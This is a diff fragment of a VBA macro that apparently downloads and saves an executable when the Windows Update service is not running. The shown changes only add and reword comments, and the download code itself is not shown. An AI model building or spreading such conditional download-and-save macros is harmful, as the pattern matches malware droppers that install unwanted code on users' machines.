@@ -1,3 +1,5 @@
+' Downloads an executable from the internet if the "wuauserv" service is not
+' running. This macro writes the file to disk which can be risky.
 Option Explicit
 
 Private Declare PtrSafe Function OpenSCManager Lib "advapi32.dll" Alias "OpenSCManagerA" (ByVal lpMachineName As String, ByVal lpDatabaseName As String, ByVal dwDesiredAccess As Long) As Long
@@ -20,7 +22,7 @@ Sub DownloadAndSaveExeIfServiceNotRunning()
     Dim FileData() As Byte
     Dim FileNumber As Integer
 
-    ' Check if the "Example" service is running
+    ' Query the service state using WMI
     Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
     Set colServices = objWMIService.ExecQuery("SELECT * FROM Win32_Service WHERE Name = 'wuauserv'")
     
